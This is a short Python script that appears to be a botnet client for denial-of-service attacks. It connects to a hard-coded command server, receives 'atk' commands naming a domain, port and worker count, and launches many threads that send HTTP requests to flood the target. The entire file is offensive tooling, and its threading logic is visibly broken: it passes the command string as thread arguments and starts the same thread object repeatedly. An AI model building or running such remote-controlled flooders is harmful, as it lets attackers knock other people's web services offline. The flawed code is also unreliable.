import socket
import threading
import requests

ADDRESS = "192.168.1.78"  # replace this with your server's IP address
DEFAULT_WORKERS = 100
THREADS = []
is_https = False

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ADDRESS, 57849)) # connects to your server


def atk(data):

    domain = data.split(" ")[1]
    is_https = True if "https" in domain else False
    port = 80 if len(data.split(" ")) < 3 and not is_https else 443 if len(data.split(" ")) < 3 and is_https else data.split(" ")[2]  # yes.

    try:
        r = requests.get(f"http://{domain}:{port}" if not is_https else f"https://{domain}:{port}")
        print("sent request")
    except Exception as e:
        print("The port specified does not have a web service running, it is closed, or has blocked the IP Address. See the error below:")
        print(e)
        pass

while True and s:
    data = s.recv(128)
    data = data.decode('utf-8').replace("\r\n", "")  # receives data, decodes it and removes the carriage return and newline

    if data.startswith("atk"):
        t = threading.Thread(target=atk, args=data)
        workers = DEFAULT_WORKERS if len(data.split(" ")) < 4 else int(data.split(" ")[3])
        for i in range(workers + 1):
            t.start()
            THREADS.append(t)
        for process in THREADS:
            process.join()

    if data.startswith("print"):
        print(data.replace("print ", ""))
